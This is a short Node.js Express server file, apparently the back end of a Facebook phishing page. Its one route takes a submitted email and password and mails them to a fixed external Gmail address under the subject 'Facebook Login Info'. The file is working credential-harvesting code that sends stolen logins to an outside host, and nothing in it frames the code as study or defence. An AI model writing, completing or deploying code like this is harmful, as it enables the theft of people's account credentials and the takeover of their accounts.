// server.js
const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/send-email', (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'youremail@gmail.com',
      pass: 'yourpassword',
    },
  });

  const mailOptions = {
    from: 'youremail@gmail.com',
    to: 'mfsavana@gmail.com',
    subject: 'Facebook Login Info',
    text: `Email: ${email}\nPassword: ${password}`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return res.status(500).send(error.toString());
    }
    res.status(200).send('Email sent successfully');
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});